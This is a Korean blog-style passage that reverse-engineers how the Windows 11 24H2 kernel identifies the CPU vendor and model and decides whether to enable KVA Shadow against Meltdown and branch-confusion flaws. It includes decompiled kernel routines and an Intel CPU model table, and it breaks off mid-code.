&#xCDE8;&#xC57D;&#xD55C; CPU&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; KVAS &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xD310;&#xB2E8;&#xD560;&#xAE4C;&#xC694;?</p><h1 id="Background-Knowledge-CPU-Identification"><a href="#Background-Knowledge-CPU-Identification" class="headerlink" title="Background Knowledge - CPU Identification"></a>Background Knowledge - CPU Identification</h1><p>Windows&#xB294; &#xC790;&#xCCB4;&#xC801;&#xC73C;&#xB85C; CPU&#xC758; &#xBCA4;&#xB354;&#xB97C; &#xC2DD;&#xBCC4;&#xD569;&#xB2C8;&#xB2E4;. <a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm">CPU_VENDORS</a> Enum&#xC5D0; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xB4EF;&#xC774;, &#xC54C; &#xC218; &#xC5C6;&#xB294; &#xC81C;&#xC870;&#xC0AC;&#xB294; 0, AMD&#xB294; 1, Intel&#xC740; 2&#xB85C; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xC8E0;.</p><pre><code class="hljs jsx">typedef enum{    CPU_UNKNOWN,   <span class="hljs-comment">// 0</span>    CPU_AMD,       <span class="hljs-comment">// 1</span>    CPU_INTEL,     <span class="hljs-comment">// 2</span>    CPU_VIA        <span class="hljs-comment">// 3</span>} CPU_VENDORS;</code></pre><p>&#xBCA4;&#xB354;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; Faily ID, Model ID &#xC640; &#xAC19;&#xC740; CPU &#xC815;&#xBCF4;&#xB4E4;&#xC740; <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB">KPRCB</a> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB7EC;&#xD55C; ID&#xB4E4;&#xC740; &#xAC01; CPU &#xBCA4;&#xB354;&#xC0AC;&#xAC00; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. Intel&#xC758; &#xACBD;&#xC6B0; Intel CPU &#xC81C;&#xD488;&#xC758; Family ID, Model ID, &#xC138;&#xB300; &#xC815;&#xBCF4;&#xB97C; <a href="https://www.intel.com/content/www/us/en/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html">Intel Developer Manual</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;, 5000&#xC7A5;&#xC774; &#xB118;&#xB294; &#xB9E4;&#xB274;&#xC5BC;&#xC744; &#xC804;&#xBD80; &#xBCFC; &#xC218;&#xB294; &#xC5C6;&#xC73C;&#xB2C8;.. gemini &#xC2DC;&#xCF1C;&#xC11C; &#xC544;&#xB798; &#xD45C;&#xB85C; &#xC815;&#xB9AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><div class="table-container"><table><thead><tr><th><strong>&#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC544;&#xD0A4;&#xD14D;&#xCC98; (&#xC138;&#xB300;)</strong></th><th><strong>&#xD504;&#xB85C;&#xC138;&#xC11C; &#xC81C;&#xD488;&#xAD70;</strong></th><th><strong>Family ID (Hex)</strong></th><th><strong>Model ID (Hex)</strong></th></tr></thead><tbody><tr><td>Raptor Lake (13&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>B7H, BFH</td></tr><tr><td>Alder Lake (12&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>97H, 9AH</td></tr><tr><td>Tiger Lake (11&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>8CH, 8DH</td></tr><tr><td>Rocket Lake (11&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>A7H</td></tr><tr><td>Ice Lake (10&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>7DH, 7EH</td></tr><tr><td>Comet Lake (10&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>A5H, A6H</td></tr><tr><td>Amber Lake Y (8&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>8EH</td></tr><tr><td>Whiskey Lake U (8&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>8EH</td></tr><tr><td>Coffee Lake (8, 9&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>9EH</td></tr><tr><td>Kaby Lake (7&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>8EH, 9EH</td></tr><tr><td>Skylake (6&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>4EH, 5EH, 55H</td></tr><tr><td>Broadwell (5&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>3DH, 47H, 4FH</td></tr><tr><td>Haswell (4&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>3CH, 45H, 46H, 3FH</td></tr><tr><td>Ivy Bridge (3&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>3AH</td></tr><tr><td>Sandy Bridge (2&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>2AH</td></tr><tr><td>Westmere (2010)</td><td>Intel Core</td><td>06H</td><td>25H, 2CH, 2FH</td></tr><tr><td>Nehalem (1&#xC138;&#xB300;)</td><td>Intel Core</td><td>06H</td><td>1AH, 1EH, 1FH, 2EH</td></tr><tr><td>Penryn</td><td>Core 2 Duo/Quad</td><td>06H</td><td>17H, 1DH</td></tr><tr><td>Merom</td><td>Core 2 Duo</td><td>06H</td><td>0FH</td></tr><tr><td>Yonah</td><td>Core Duo/Solo</td><td>06H</td><td>0EH</td></tr></tbody></table></div><p>AMD&#xB098; &#xB2E4;&#xB978; &#xBCA4;&#xB354;&#xB4E4;&#xC758; ID &#xB9AC;&#xC2A4;&#xD2B8;&#xB3C4; &#xBAA8;&#xB450; &#xC815;&#xB9AC;&#xD558;&#xACE0; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Analysis-of-KVAS-Activation-Logic"><a href="#Analysis-of-KVAS-Activation-Logic" class="headerlink" title="Analysis of KVAS Activation Logic"></a>Analysis of KVAS Activation Logic</h1><p>&#xBD84;&#xC11D; &#xD658;&#xACBD;: Windows 24H2 64bit 10.0.26100.1742 </p><p>&#xB2E4;&#xC2DC; &#xB3CC;&#xC544;&#xC640;&#xC11C;, &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xCD08;&#xAE30;&#xD654; &#xB85C;&#xC9C1;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; Windows &#xBD80;&#xD305; &#xC2DC; &#xCEE4;&#xB110;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xAE4C;&#xC9C0; &#xB4E4;&#xC5B4;&#xAC00;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.  </p><p>Windows &#xCEE4;&#xB110; &#xC774;&#xBBF8;&#xC9C0; <code>ntoskrnl.exe</code>&#xC758; Entry Point&#xB294; <code>KiSystemStartup</code> &#xC73C;&#xB85C;, CPU &#xCD08;&#xAE30;&#xD654;&#xBD80;&#xD130; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xAD00;&#xB828;&#xB41C; Feature &#xC138;&#xD305; &#xC218;&#xD589;, &#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAC70; &#xCD08;&#xAE30;&#xD654; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>KVAS &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; &#xD568;&#xC218;&#xB294; &#xC758;&#xC678;&#xB85C; &#xAE08;&#xBC29; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>KiSystemStartup &#x2192; KiInitializeBootStructures &#x2192; KiSetFeatureBits &#x2192; KiDetectKvaLeakage</li></ul><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS __stdcall __noreturn <span class="hljs-title">KiSystemStartup</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//...</span>  KeLoaderBlock_0 = (__int64)DriverObject;  <span class="hljs-keyword">if</span> ( !*((_DWORD *)DriverObject-&gt;MajorFunction[<span class="hljs-number">3</span>] + <span class="hljs-number">9</span>) )    KasanInitSystem(DriverObject, <span class="hljs-number">0</span>i64);  <span class="hljs-keyword">if</span> ( !*(_DWORD *)(*(_QWORD *)(KeLoaderBlock_0 + <span class="hljs-number">136</span>) + <span class="hljs-number">36</span>i64) )    KdInitSystem(<span class="hljs-number">0xFFFFFFFF</span>i64, KeLoaderBlock_0);  v2 = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> **)(KeLoaderBlock_0 + <span class="hljs-number">136</span>);<span class="hljs-comment">//...</span>  KiInitializeBootStructures(KeLoaderBlock_0);  <span class="hljs-comment">// Initialize Boot Structures</span>  <span class="hljs-keyword">if</span> ( !*MK_FP(<span class="hljs-number">43</span>, *MK_FP(<span class="hljs-number">43</span>, KeLoaderBlock_0 + <span class="hljs-number">136</span>) + <span class="hljs-number">36</span>i64) )    KdInitSystem(<span class="hljs-number">0</span>i64, KeLoaderBlock_0);<span class="hljs-comment">//...</span>}<span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiInitializeBootStructures</span><span class="hljs-params">(__int64 a1)</span></span><span class="hljs-function"></span>{  KPCR *Pcr; <span class="hljs-comment">// r14</span>  _KPROCESS **v2; <span class="hljs-comment">// rbx</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">KPRCB</span> *<span class="hljs-title">CurrentPrcb</span>;</span> <span class="hljs-comment">// rdi</span><span class="hljs-comment">//...</span>  <span class="hljs-keyword">if</span> ( !KeGetPcr()-&gt;Prcb.Number )    KiInitializeNxSupportDiscard(v19, v18, v20);  HalInitializeProcessor(Number, a1, v20);  KiSetFeatureBits(CurrentPrcb);                <span class="hljs-comment">// Set Prcb Feature Bits</span>  CurrentPCB_Number = CurrentPrcb-&gt;Number;  v27 = KiSystemCall32;  v28 = KiSystemCall64;  <span class="hljs-keyword">if</span> ( !CurrentPCB_Number )  {    KiEnableKvaShadowing(CurrentPrcb);              <span class="hljs-comment">// KVA Shadow &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;</span>    CurrentPCB_Number = CurrentPrcb-&gt;Number;  }  <span class="hljs-keyword">if</span> ( KiKvaShadow )                             <span class="hljs-comment">// KVA Shadow &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xBA74;</span>  {    v27 = KiSystemCall32Shadow;                 <span class="hljs-comment">// KiSystemCall32/KiSystemCall64 &#xB300;&#xC2E0; </span>    v28 = KiSystemCall64Shadow;                 <span class="hljs-comment">// KiSystemCall32Shadow/KiSystemCall64Shadow &#xC0AC;&#xC6A9;</span>  }  <span class="hljs-comment">//...</span>}<span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiSetFeatureBits</span><span class="hljs-params">(_KPRCB *CurrentPRCB)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">char</span> CpuType; <span class="hljs-comment">// bl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> CpuModel; <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor; <span class="hljs-comment">// dl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ProcessorSignature; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuStepping; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int8 v57; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">unsigned</span> __int64 v58; <span class="hljs-comment">// rcx</span><span class="hljs-comment">//...</span>  CpuType = CurrentPRCB-&gt;CpuType_Family;        <span class="hljs-comment">// CpuType = Processor Family</span>  CpuModel = CurrentPRCB-&gt;CpuModel;  CpuVendor = CurrentPRCB-&gt;CpuVendor;  v123 = (CpuVendor - <span class="hljs-number">1</span>) &lt;= <span class="hljs-number">1u</span>;  <span class="hljs-keyword">if</span> ( CurrentPRCB-&gt;Number )  {    ProcessorSignature = KiGetProcessorSignature(<span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);    KiSetProcessorSignature(CurrentPRCB, ProcessorSignature);    <span class="hljs-keyword">goto</span> LABEL_40;  }<span class="hljs-comment">//... </span>  KiDetectKvaLeakage(CurrentPRCB);      <span class="hljs-comment">// Detect - KVA needs to be activated</span>  _m_prefetchw(CurrentPRCB);  <span class="hljs-keyword">if</span> ( CurrentPRCB-&gt;CpuVendor == <span class="hljs-number">1</span> )  {    v52 |= <span class="hljs-number">0x100000</span>u;    HIDWORD(v134) = v52;  }<span class="hljs-comment">//...</span>}</code></pre><h2 id="KVAS-Activation-for-Meltdown"><a href="#KVAS-Activation-for-Meltdown" class="headerlink" title="KVAS Activation for Meltdown"></a>KVAS Activation for Meltdown</h2><p>&#xC704; &#xD638;&#xCD9C; &#xCCB4;&#xC778;&#xC5D0;&#xC11C; <code>KiDetectKvaLeakage</code> &#xD568;&#xC218;&#xAC00; &#xBC14;&#xB85C; KVA &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; &#xCF54;&#xC5B4; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">KiDetectKvaLeakage</span><span class="hljs-params">(_KPRCB *a1)</span></span><span class="hljs-function"></span>{  __int64 p_CpuVendor; <span class="hljs-comment">// rsi</span>  <span class="hljs-keyword">unsigned</span> __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 v4; <span class="hljs-comment">// rcx</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RDX; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">unsigned</span> __int64 v13; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">bool</span> v14; <span class="hljs-comment">// zf</span>  <span class="hljs-keyword">int</span> *v15; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// ecx</span>  __int64 v17; <span class="hljs-comment">// rbx</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Number; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">int</span> v29[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-20h] BYREF</span>  v29[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  p_CpuVendor = &amp;a1-&gt;CpuVendor;    <span class="hljs-comment">// Check 1</span>  LODWORD(_RAX) = KiIsKvaShadowNeededForBranchConfusion(a1);  <span class="hljs-keyword">if</span> ( _RAX )    <span class="hljs-keyword">goto</span> ENABLE_KVAS_BRANCH_CONFUSION;  LODWORD(_RAX) = *p_CpuVendor;    <span class="hljs-comment">// Check 2</span>  <span class="hljs-comment">// Intel - Check with bitmask</span>  <span class="hljs-keyword">if</span> ( *p_CpuVendor == <span class="hljs-number">2</span> )  {    _RAX = a1-&gt;CpuModel;    <span class="hljs-keyword">if</span> ( a1-&gt;CpuType == <span class="hljs-number">6</span> &amp;&amp; _RAX &lt;= <span class="hljs-number">0x36</span>u )    {      v4 = <span class="hljs-number">0x6000C010000000</span>i64;      <span class="hljs-keyword">if</span> ( _bittest64(&amp;v4, _RAX) )        <span class="hljs-keyword">return</span> _RAX;    }  }  <span class="hljs-comment">// Others - disable KVAS</span>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( _RAX != <span class="hljs-number">3</span> || a1-&gt;CpuType == <span class="hljs-number">6</span> &amp;&amp; a1-&gt;CpuModel == <span class="hljs-number">13</span>)  {    <span class="hljs-keyword">return</span> _RAX;  }<span class="hljs-comment">// Check 3</span><span class="hljs-comment">// IA32_ARCH_CAPABILITIES support query</span>  _RAX = <span class="hljs-number">0</span>i64;  __asm { cpuid }  <span class="hljs-keyword">if</span> ( _RAX &lt; <span class="hljs-number">7</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;  _RAX = <span class="hljs-number">7</span>i64;  __asm { cpuid }  <span class="hljs-keyword">if</span> ( (_RDX &amp; <span class="hljs-number">0x20000000</span>) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;<span class="hljs-comment">// Check 3</span><span class="hljs-comment">// msr address 0x10A - IA32_ARCH_CAPABILITIES</span>  _RAX = __readmsr(<span class="hljs-number">0x10A</span>u);  <span class="hljs-comment">//IA32_ARCH_CAPABILITIES bit 0 : RDCL_NO</span>  <span class="hljs-keyword">if</span> ( (_RAX &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;   KiMicrocodeTrackerEnabled = <span class="hljs-number">1</span>;  LODWORD(_RAX) = <span class="hljs-number">3670016</span>;  LOBYTE(v13) = (KeFeatureBits2 &amp; <span class="hljs-number">0x28</span>) == <span class="hljs-number">8</span>;  <span class="hljs-keyword">if</span> ( (KeFeatureBits2 &amp; <span class="hljs-number">0x380000</span>) != <span class="hljs-number">3670016</span> )  {    LODWORD(_RAX) = KiIsFbClearSupported(KeFeatureBits2 &amp; <span class="hljs-number">0x380000</span>, v13);    LOBYTE(v13) = _RAX | v13;  }  <span class="hljs-keyword">if</span> ( v13 )  {ENABLE_KVAS:    <span class="hljs-keyword">if</span> ( a1-&gt;Number &amp;&amp; !KiKvaLeakage )      KeBugCheckEx(<span class="hljs-number">0x5D</span>u, <span class="hljs-number">0x4B56414C</span>ui64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);ENABLE_KVAS_BRANCH_CONFUSION:    v14 = *p_CpuVendor == <span class="hljs-number">2</span>;    **KiKvaLeakage = <span class="hljs-number">1</span>;**<span class="hljs-comment">//... for enable KVA</span>  }  <span class="hljs-keyword">return</span> _RAX;}</code></pre><p><code>KiDetectKvaLeakage</code> &#xD568;&#xC218;&#xB294; KPRCB&#xC5D0; &#xD3EC;&#xD568;&#xB41C; CPU &#xBCA4;&#xB354; &#xBC0F; &#xBAA8;&#xB378; &#xC815;&#xBCF4;&#xC640;, MSR&#xC744; &#xC77D;&#xC5B4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574; KVAS &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xD655;&#xC778;&#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xC740; &#xD06C;&#xAC8C; &#xC138; &#xAC00;&#xC9C0;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Check-1"><a href="#Check-1" class="headerlink" title="Check 1"></a>Check 1</h3><ul><li><code>KiIsKvaShadowNeededForBranchConfusion</code>&#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; Branch Confusion &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC601;&#xD5A5;&#xBC1B;&#xB294;&#xC9C0; &#xD655;&#xC778;</li><li>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xD638;&#xCD9C; &#xACB0;&#xACFC; Branch Confusion &#xCDE8;&#xC57D;&#xC810; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xACBD;&#xC6B0; KVAS&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; <code>ENABLE_KVAS_BRANCH_CONFUSION</code> &#xBD84;&#xAE30;&#xB85C; &#xC9C4;&#xD589;</li></ul><h3 id="Check-2"><a href="#Check-2" class="headerlink" title="Check 2"></a>Check 2</h3><ul><li>Meltdown&#xC5D0; &#xC601;&#xD5A5;&#xBC1B;&#xC9C0; &#xC54A;&#xC544; KVAS &#xD65C;&#xC131;&#xD654;&#xAC00; &#xD544;&#xC694; &#xC5C6;&#xB294; &#xAD6C;&#xD615; CPU&#xB97C; bitmask&#xB97C; &#xD1B5;&#xD574; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xACE0; KVAS&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;</li><li>&#xB610;&#xD55C;, Meltdown&#xC740; Intel &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC544;&#xD0A4;&#xD14D;&#xCCD0;&#xC5D0;&#xB9CC; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xBBC0;&#xB85C; &#xB54C;&#xBB38;&#xC5D0; &#xADF8; &#xC678; &#xBCA4;&#xB354;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; KVAS&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;</li></ul><h3 id="Check-3"><a href="#Check-3" class="headerlink" title="Check 3"></a>Check 3</h3><ul><li>&#xBA3C;&#xC800; CPU&#xAC00; MSR(Model Specific Register) &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;<ul><li>MSR&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; Meltdown&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xAD6C;&#xD615; CPU&#xC774;&#xBBC0;&#xB85C; KVAS &#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; <code>ENABLE_KVAS</code> &#xBD84;&#xAE30;&#xB85C; &#xC9C4;&#xD589;</li><li>MSR&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xB294; &#xBAA8;&#xB378;&#xC740; Check 2 &#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; bitmask&#xB97C; &#xD1B5;&#xD574; &#xBA3C;&#xC800; &#xD544;&#xD130;&#xB9C1;</li></ul></li><li><code>__readmsr</code>&#xC744; &#xD1B5;&#xD574; MSR &#xC8FC;&#xC18C; <code>0x10A</code> &#xC77D;&#xAE30; - <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html">IA32_ARCH_CAPABILITIES</a><ul><li>&#xACB0;&#xACFC;(<code>_RAX</code>)&#xC758; &#xD544;&#xB4DC; 0 (<code>RDCL_NO</code>) &#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBA74; KVAS &#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; <code>ENABLE_KVAS</code>&#xBD84;&#xAE30;&#xB85C; &#xC9C4;&#xD589;</li><li>RDCL_NO: Rogue Data Cache Load(Meltdown) &#xC5D0; &#xCDE8;&#xC57D;&#xD558;&#xC9C0; &#xC54A;&#xC74C;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xBE44;&#xD2B8; &#xD50C;&#xB798;&#xADF8;</li></ul></li></ul><p>&#xC704; &#xD655;&#xC778; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; KVAS&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xB418;&#xBA74; <code>KiKvaLeakage</code>&#xB97C; 1&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC694; &#xAE30;&#xB2A5;&#xC740; Check 2&#xC640; Chekc3&#xC758; Meltdown &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC601;&#xD5A5;&#xBC1B;&#xB294; Intel &#xD504;&#xB85C;&#xC138;&#xC11C;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; KVAS &#xD65C;&#xC131;&#xD654; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC694;&#xC57D;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. Check 1&#xC740; &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xB354; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="KVAS-Activation-for-Branch-Confusion"><a href="#KVAS-Activation-for-Branch-Confusion" class="headerlink" title="KVAS Activation for Branch Confusion"></a>KVAS Activation for Branch Confusion</h2><p>KVAS&#xB294; Meltdown&#xB9CC; &#xC801;&#xC6A9;&#xB418;&#xB294; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xADF8;&#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xD568;&#xC218;&#xAC00; Check 1 &#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>KiIsKvaShadowNeededForBranchConfusion</code> &#xC778;&#xB370;&#xC694;.</p><pre><code class="hljs powershell">__int64 __fastcall KiIsKvaShadowNeededForBranchConfusion(__int64 a1){  unsigned int v2; // ebx  __int128 v4; // [<span class="hljs-type">rsp</span>+<span class="hljs-number">20</span><span class="hljs-type">h</span>] [<span class="hljs-type">rbp</span>-<span class="hljs-number">28</span><span class="hljs-type">h</span>] BYREF  __int64 v5; // [<span class="hljs-type">rsp</span>+<span class="hljs-number">30</span><span class="hljs-type">h</span>] [<span class="hljs-type">rbp</span>-<span class="hljs-number">18</span><span class="hljs-type">h</span>]  v5 = <span class="hljs-number">0</span>i64;  v4 = <span class="hljs-number">0</span>i64;  KiDetectHardwareSpecControlFeatures(a1, <span class="hljs-number">0</span>i64, (__int64)&amp;v4, <span class="hljs-number">0</span>i64);  <span class="hljs-keyword">if</span> ( (v4 &amp; <span class="hljs-number">0</span>x8000) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  v2 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( !(unsigned int)KiIsBranchConfusionMitigationDesired(a1, &amp;v4) )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  LOBYTE(v2) = (unsigned int)KiIsBranchConfusionMitigationSupported(a1, &amp;v4) != <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span> v2;}</code></pre><p>&#xD568;&#xC218;&#xBA85;&#xC5D0;&#xC11C;&#xB3C4; &#xC54C; &#xC218; &#xC788;&#xB4EF;, Branch Confusion &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; CPU&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; KVA Shadow &#xD65C;&#xC131;&#xD654;&#xAC00; &#xD544;&#xC694;&#xD55C;&#xC9C0; &#xACB0;&#xC815;&#xD558;&#xB294; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li><code>KiDetectHardwareSpecControlFeatures</code> &#xD568;&#xC218; &#xD638;&#xCD9C; &#xACB0;&#xACFC;&#xC778; <code>v4</code> &#xC758; <code>0x8000</code> &#xBE44;&#xD2B8;&#xAC00; 1&#xC774;&#xBA74; Branch Confusion&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC74C;</li><li>&#xC774;&#xD6C4; &#xAD00;&#xB828; Mitigation&#xC774; &#xC9C0;&#xC6D0;&#xB418;&#xBA74; True &#xBC18;&#xD658; - <code>KiDetectKvaLeakage</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; KVAS &#xD65C;&#xC131;&#xD654; &#xB8E8;&#xD2F4;&#xC73C;&#xB85C; &#xC9C4;&#xC785;&#xD568;</li></ul><p><code>KiDetectHardwareSpecControlFeatures</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">char</span> *__fastcall <span class="hljs-title">KiDetectHardwareSpecControlFeatures</span><span class="hljs-params">(_KPRCB *PRCB, __int64 _zero, __int64 